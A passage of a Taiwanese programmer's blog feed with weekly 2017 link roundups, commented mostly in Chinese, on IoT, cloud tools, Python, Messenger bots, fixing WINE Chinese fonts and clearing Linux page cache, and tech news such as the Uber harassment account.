&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/ZigBee"&gt;https://en.wikipedia.org/wiki/ZigBee&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;依區域範疇劃分  &lt;ul&gt;
&lt;li&gt;Near Field  &lt;ul&gt;
&lt;li&gt;&amp;lt; 10 cm  &lt;/li&gt;
&lt;li&gt;NFC Forum  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PAN  &lt;ul&gt;
&lt;li&gt;1m ~ 50m  &lt;/li&gt;
&lt;li&gt;Bluetooth, ZigBee, Thread, IEEE 802.15.4  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LAN  &lt;ul&gt;
&lt;li&gt;50m ~ 1km  &lt;/li&gt;
&lt;li&gt;Wi-Fi, Ethernet  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;(LP)WAN  &lt;ul&gt;
&lt;li&gt;1km ~ 50km  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Sigfox"&gt;SigFox&lt;/a&gt;, &lt;a href="http://www.semtech.com/wireless-rf/internet-of-things/what-is-lora/"&gt;LoRa&lt;/a&gt;, 5G, 4G, 3G, Internet  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見 PAN/WAN 之特性  &lt;ul&gt;
&lt;li&gt;EnOcean  &lt;/li&gt;
&lt;li&gt;ZigBee  &lt;/li&gt;
&lt;li&gt;Thread  &lt;/li&gt;
&lt;li&gt;BLE  &lt;/li&gt;
&lt;li&gt;WiFi  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="IoT"></category><category term="Node.js"></category></entry><entry><title>Y2017W10</title><link href="https://blog.m157q.tw/posts/2017/03/13/y2017w10/" rel="alternate"></link><published>2017-03-13T11:29:54+08:00</published><updated>2017-03-13T11:29:54+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-03-13:posts/2017/03/13/y2017w10/</id><summary type="html">&lt;h3&gt;apache&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://lucene.apache.org/"&gt;Apache Lucene - Welcome to Apache Lucene&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;2017/03/09 晚上 Booking.com 在台北的 FX Hotel 辦了個 meetup，講了他們內部搜尋引擎實作，裡頭提到其中一個用到的工具。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jacky.seezone.net/2017/03/09/8657/"&gt;&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@martinetlee/programming-k6-1-c89a349433a7#.j0gu2htsx"&gt;我如何帶國小生學程式（一） – Martinet Lee – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;很棒的教學經驗談  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://breezymove.blogspot.tw/2017/02/pay-what-you-want.html"&gt;風吹草動: Pay what you want 隨心付&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;自由付款，自由軟體並非免費。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://jacky.seezone.net/2017/02/10/8644/"&gt;開卷筆記—未來的犯罪&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;萬物皆可駭的時代呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2017/03/welcome-Kaggle-to-Google-Cloud.html"&gt;Google Cloud Platform Blog: Welcome Kaggle to Google Cloud&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;昨天才知道 Kaggle  &lt;/li&gt;
&lt;li&gt;原來社群也是可以被公司買下來的嗎  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2017/03/Google-Cloud-Container-Builder-a-fast-and-flexible-way-to-package-your-software.html"&gt;Google Cloud Platform Blog: Google Cloud Container Builder: a fast and flexible way to package your software&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;終於可以不用自己專門弄台 GCE 來當 Image builder 了嗎  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2318-announcing-open-source-guides"&gt;Announcing Open Source Guides · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GitHub 開了個開源指南  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2330-restrict-review-dismissals-with-protected-branches"&gt;Restrict review dismissals with protected branches · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GitHub PR 管理的新功能  &lt;/li&gt;
&lt;li&gt;可以設定誰才能把 request change 轉成 comment  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fukuball/Trump-Driven-Development"&gt;GitHub - fukuball/Trump-Driven-Development: A curated list of Trump Driven Development&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;蒐集跟 Donal Trump 有關的 programming related list. LOL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://nolanlawson.com/2017/03/05/what-it-feels-like-to-be-an-open-source-maintainer/"&gt;What it feels like to be an open-source maintainer | Read the Tea Leaves&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;真的是超級累的啊，難怪很多人的小專案變成熱門的大專案以後有的就突然不維護了。  &lt;/li&gt;
&lt;li&gt;如何讓用的人轉換成一起貢獻的人這件事真的很重要。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jamesbvaughan.com/python-twilio-scraping/"&gt;Finding Free Food with Python&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 request 拿網頁  &lt;/li&gt;
&lt;li&gt;用 bs4 parse  &lt;/li&gt;
&lt;li&gt;用 re 找 free food  &lt;/li&gt;
&lt;li&gt;用 Twilo 送簡訊給自己  &lt;/li&gt;
&lt;li&gt;幾行的 script  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://doughellmann.com/blog/2017/03/06/pickle-object-serialization-pymotw-3/"&gt;pickle — Object Serialization — PyMOTW 3 – Doug Hellmann&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;要搭配 hmac 做驗證啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://medium.com/@maxbraun/this-machine-turns-trump-tweets-into-planned-parenthood-donations-4ece8301e722#.l7mkevq90"&gt;This Machine Turns Trump Tweets into Planned Parenthood Donations&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;接 NLP 的 API 去分析 Trump 的 tweet，如果他讚揚某間公司，就可以買入該公司的股票，如果他貶低某間公司，就趕快賣掉那間公司的股票。  &lt;/li&gt;
&lt;li&gt;好酷喔 在往歐洲的飛機上完成雛型  &lt;/li&gt;
&lt;li&gt;But don't bet your life savings on it. Markets are unpredictable. Trump is unpredictable. XD  &lt;/li&gt;
&lt;li&gt;定時發 tweet 的 bot: &lt;a href="https://twitter.com/Trump2Cash"&gt;https://twitter.com/Trump2Cash&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;GitHub Repo: &lt;a href="https://github.com/maxbbraun/trump2cash/"&gt;https://github.com/maxbbraun/trump2cash/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.dailycold.tw/7401/%E7%82%BA%E4%BB%80%E9%BA%BC%E8%BC%B8%E7%90%83%E4%BA%86%E8%A6%81%E5%90%83%E9%8D%8B%E8%B2%BC%E5%91%A2%EF%BC%9F/"&gt;為什麼輸球了要吃鍋貼呢？ – 每日一冷 – 你的冷知識入口&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;你知道嗎？【為什麼輸球了要吃鍋貼呢？】 #本日冷知識1065 不知道最近每日一冷的讀者們是不是和吐司碟一樣，總是忍不住被世界12強棒球賽的賽事轉播給吸引的無法自拔呢？雖然我們無緣挺進八強，但是不管你是一日球迷  &lt;/li&gt;
&lt;li&gt;雖敗遊龍 LOL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/permalink.php?story_fbid=1600114916669620&amp;amp;id=100000133808589"&gt;杜紫宸 - 台大電機研究所學生自製的實驗室門口對聯 ...&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;假論文假發票爾等造假  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;真本事真性情我輩認真  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;偉哉吾校  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/HolyMosquito/photos/a.1470258333251822.1073741828.1468466990097623/1876891482588503/?type=3&amp;amp;theater"&gt;小聖蚊的治國日記 - Timeline&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;雖然我來自英國，但是我來到美國，我就選擇做美國人，我的子孫也是美國人。這種叫作移民。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;雖然在台灣這個鬼島，但我永遠都是中國人，我的子孫也都要做堂堂正正的中國人。這種叫作殖民。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;movie&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/movie/M.1488729287.A.84F.html"&gt;[討論] 《異星入境》與相關的語言學迷思 (有雷) - 看板 movie - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇講 Arrival 的文章真的超專業的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;windows&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://hultbergs.org/defrag/"&gt;Windows 95 Defrag Simulator&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好懷念的磁碟重組畫面 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ptt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Boy-Girl/M.1489082550.A.E2A.html"&gt;Re: [求助] 女友發現我會自慰後以後哭了 - 看板 Boy-Girl - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;優質廢文  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="apache"></category><category term="blog"></category><category term="gcp"></category><category term="github"></category><category term="movie"></category><category term="programmer"></category><category term="ptt"></category><category term="python"></category><category term="taiwan"></category><category term="web"></category><category term="windows"></category></entry><entry><title>Y2017W09</title><link href="https://blog.m157q.tw/posts/2017/03/06/y2017w09/" rel="alternate"></link><published>2017-03-14T11:15:00+08:00</published><updated>2017-03-14T11:15:00+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-03-06:posts/2017/03/06/y2017w09/</id><summary type="html">&lt;h3&gt;facebook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://messengerblog.com/platform-updates/messenger-platform-1-4-brings-even-more-tools-to-build-great-experiences/"&gt;Messenger Platform 1.4 Brings Even More Tools to Build Great Experiences – Messenger Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Facebook Messenger Platform 1.4 版，最近剛好在碰 Messenger Bot 的部份，所以得追一下。  &lt;/li&gt;
&lt;li&gt;這版改最大的大概就是 Persistent Menu 的結構吧，從原本只能放 5 個最上層的按鈕，改成放 3 個最上層的按鈕，然後每個按鈕的下一層可以再放 5 個按鈕。  &lt;/li&gt;
&lt;li&gt;另外的則是 persistent Menu 加入了 locale 的設定，可以設定 default locale 要回的訊息，然後可以針對不同的 locale 做設定，比如英語系的國家就回英文的訊息，中文的則回中文等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/unixpickle/fbmsgr"&gt;unixpickle/fbmsgr: Reverse engineering Facebook Messenger&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有人自己用 Golang reverse 了一個 Facebook Messenger bot 出來...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://sky-dogod.blogspot.com/2008/10/wine.html"&gt;Doggy: WINE 解決中文亂碼&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近有用到 WINE，又遇到中文亂碼的問題，花了一些時間踩了些雷以後，發現主要有兩種問題：  &lt;ul&gt;
&lt;li&gt;第一種是字型問題，解法就照上面這篇寫的一樣，把字型複製到 &lt;code&gt;~/.wine/driver_c/windows/Fonts&lt;/code&gt; 之後，再用編輯器開個 &lt;code&gt;font.reg&lt;/code&gt; 寫入下方的內容後存檔  &lt;/li&gt;
&lt;li&gt;之後再打開 &lt;code&gt;~/.wine/driver_c/windows/regedit.exe&lt;/code&gt; or &lt;code&gt;$ wine regedit&lt;/code&gt;，選擇 import 剛剛儲存的 &lt;code&gt;font.reg&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;另外一種則是 locale 的問題，必須視執行軟體的情況修改 &lt;code&gt;LC_ALL&lt;/code&gt; 和 &lt;code&gt;LANG&lt;/code&gt; 這兩個環境變數  &lt;ul&gt;
&lt;li&gt;可能是 &lt;code&gt;$ export LC_ALL=zh_TW.UTF-8&lt;/code&gt;, &lt;code&gt;$ export LANG=zh_TW.UTF-8&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;也可能是 &lt;code&gt;$ export LC_ALL=zh_TW.Big5&lt;/code&gt;, &lt;code&gt;$ export LANG=zh_TW.Big5&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我遇到的是這兩種問題都得一起解決才不會出現任何中文亂碼。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;REGEDIT4  

[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\FontSubstitutes]  
&amp;quot;Arial&amp;quot;=&amp;quot;Arial&amp;quot;  
&amp;quot;Arial CE,238&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Arial CYR,204&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Arial Greek,161&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Arial TUR,162&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Courier New&amp;quot;=&amp;quot;Courier New&amp;quot;  
&amp;quot;Courier New CE,238&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Courier New CYR,204&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Courier New Greek,161&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Courier New TUR,162&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;MingLiU&amp;quot;=&amp;quot;MingLiU&amp;quot;  
&amp;quot;PMingLiU&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;FixedSys&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Helv&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Helvetica&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;MS Sans Serif&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;MS Shell Dlg&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;MS Shell Dlg 2&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;System&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Tahoma&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Times&amp;quot;=&amp;quot;Times&amp;quot;  
&amp;quot;Times New Roman&amp;quot;=&amp;quot;Times New Roman&amp;quot;  
&amp;quot;Times New Roman CE,238&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Times New Roman CYR,204&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Times New Roman Greek,161&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Times New Roman TUR,162&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&amp;quot;Tms Rmn&amp;quot;=&amp;quot;PMingLiU&amp;quot;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;news&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.cnet.com/news/icon-smart-condom-ring/"&gt;Smart condom ring i.Con is like a Fitbit for your man bits - CNET&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The i.Con Smart Condom, which markets itself as the "world's first smart condom," is actually a ring that fits over a boring, dumb condom and claims to track the exercise of your man bits, as well as detect chlamydia and syphilis.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;智慧型保險套，可以追蹤運動時間、射速、射出角度還可以分享到社群軟體...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.mozilla.org/blog/2017/02/27/mozilla-acquires-pocket"&gt;Mozilla Acquires Pocket | The Mozilla Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Mozilla 竟然把 Pocket 買了，聽說 Firefox 跟 Pocket 的整合性也提高了，真好奇買了 Pocket 的用意是什麼？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/cyberomin/status/835888786462625792"&gt;Celestine Omin on Twitter: "I was just asked to balance a Binary Search Tree by JFK's airport immigration. Welcome to America."&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;I was just asked to balance a Binary Search Tree by JFK's airport immigration. Welcome to America.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;因為川普禁令，在入境的時候被美國海關考試，而且還不是只有考一題平衡二元搜尋樹而已，而是要他寫一份 A4 考卷...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.techug.com/post/good-programmer-good-habit.html"&gt;有前途的程序員的16個習慣，你擁有幾個？ | 程序師&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;大部份都還算認同，算是可以拿來提醒自己的文章吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/kylinfish/clean-code-72688451"&gt;無暇的程式碼 Clean Code 心得分享&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;挺棒的要點分享，Clean Code 真的是值得一看的好書啊，雖然是用 Java 當範例，不過其他程式語言的使用者來看也不會覺得落差很大就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.wu-boy.com/2017/02/caddy-setting-with-drone-ci-server/"&gt;Caddy 搭配 Drone 伺服器設定 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Caddy 直接就有 HTTPS 可用，因為會自動幫忙申請 Let's encrypt 憑證  &lt;/li&gt;
&lt;li&gt;之後有機會的話好像可以試試看，現在要弄支援 HTTPS 的 HTTP server 真的比以前簡單很多了啊j  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/02/tequila-wine-mixer-2017/"&gt;幾種簡單的 龍舌蘭 調酒 (雞尾酒) - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;比較知道的還是 Tequila Bomb 就是，其他的有機會的話也可以來試試看？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/gossiping/M.1488390813.A.E39.html"&gt;Re: [新聞] 央行去年每月賺188億元 - 看板 Gossiping - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇也算是個精彩好文呢，原來外匯存底高不是什麼好事啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="facebook"></category><category term="golang"></category><category term="life"></category><category term="linux"></category><category term="news"></category><category term="programmer"></category><category term="programming"></category><category term="taiwan"></category><category term="web"></category></entry><entry><title>Y2017W08</title><link href="https://blog.m157q.tw/posts/2017/02/27/y2017w08/" rel="alternate"></link><published>2017-03-13T12:48:00+08:00</published><updated>2017-03-13T12:48:00+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-02-27:posts/2017/02/27/y2017w08/</id><summary type="html">&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dotblogs.com.tw/hatelove/2017/01/26/dead-fish-smell-by-reading-understanding-patterns-of-project-behavior"&gt;[遛書]項目百態－死魚&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;data science&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://36kr.com/p/5064677.html"&gt;大數據技術在預測性營銷上的實踐9個問題&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;devops&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/chickenwu/web-application-72464042"&gt;大型 Web Application 轉移到微服務的經驗分享&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://chengl.com/kubectl-authentication-made-simple/"&gt;kubectl Authentication Made Simple&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/acme"&gt;google/acme: A simple ACME command line tool without 3rd party deps!&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;ACME-complient Go client library and a command line tool. Neither has 3rd party dependencies. Also, see https://letsencrypt.org.  This package is a work in progress and makes no API stability promises.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;Google 用 golang 寫了一個 Let's Encrypt 的 CLI client.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;kswapd&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bbs.archlinux.org/viewtopic.php?id=144702"&gt;kswapd using 100% CPU, I don't even have swap. / Kernel &amp;amp; Hardware / Arch Linux Forums&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This process kswapd (kswapd0, actually) suddenly starts using 100% of one of my cores for no good reason, usually when moving many GBs around, but sometimes for no good reason at all.  I have no swap.  It also prevents the computer from sucessfully suspending.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;kswapd 會在記憶體用盡的時候佔據大量的 CPU 資源，導致速度變得很慢。  &lt;/li&gt;
&lt;li&gt;如果遇到的話可以透過 &lt;code&gt;sudo sh -c "sync; echo 3 &amp;gt; /proc/sys/vm/drop_caches"&lt;/code&gt; 這個指令來釋放佔據記憶體的 Cache  &lt;/li&gt;
&lt;li&gt;參考資料  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://linux-mm.org/Drop_Caches"&gt;https://linux-mm.org/Drop_Caches&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gtwang.org/linux/linux-cache-memory-linux/"&gt;https://blog.gtwang.org/linux/linux-cache-memory-linux/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2010/10/linux-cached-memory-release-2010/"&gt;https://blog.longwin.com.tw/2010/10/linux-cached-memory-release-2010/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://huenlil.pixnet.net/blog/post/26822270-%5B%E8%BD%89%5D-%E9%87%8B%E6%94%BElinux%E8%A8%98%E6%86%B6%E9%AB%94"&gt;http://huenlil.pixnet.net/blog/post/26822270-%5B%E8%BD%89%5D-%E9%87%8B%E6%94%BElinux%E8%A8%98%E6%86%B6%E9%AB%94&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;movie&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jacky.seezone.net/2017/02/02/8636/"&gt;《Arrival》的宇宙觀› 網絡暴民Jacky's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看來原著小說好像值得一看  &lt;/li&gt;
&lt;li&gt;電影似乎省略不少細節？  &lt;/li&gt;
&lt;li&gt;原著小說中文翻譯版：&lt;a href="https://krantasblog.blogspot.tw/2016/06/story-of-your-life.html"&gt;https://krantasblog.blogspot.tw/2016/06/story-of-your-life.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;news&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.susanjfowler.com/blog/2017/2/19/reflecting-on-one-very-strange-year-at-uber"&gt;Reflecting on one very, very strange year at Uber — Susan J. Fowler&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;As most of you know, I left Uber in December and joined Stripe in January. I've gotten a lot of questions over the past couple of months about why I left and what my time at Uber was like.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;在 Uber 待了一年的女性工程師爆料 Uber 裡頭對於女性工程師有多麼的不友善，主管的性騷擾、HR 的漠視以及發現其他女性工程師也有遇到同樣的問題進而到大量女性工程師離職等等，非常的誇張。  &lt;/li&gt;
&lt;li&gt;Uber 在技術方面沒話說，但是在法律以及工作文化方面只怕已是聲名狼籍，剛好還搭上在台灣因為無法配合法律問題而暫停營業的風潮，所以這篇也被台灣許多科技媒體轉發。  &lt;/li&gt;
&lt;li&gt;也因為這件事，之後也有非常多的 Uber 工程師提出離職申請。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/PolicyStat/terrarium"&gt;GitHub - PolicyStat/terrarium: Package and ship relocatable python virtualenvs, like a boss.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用這個打包環境 佈署時就不用等 pip 不錯  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CloudBleed 系列  &lt;ul&gt;
&lt;li&gt;Google Project Zero 的 Taviso 回報漏洞  &lt;ul&gt;
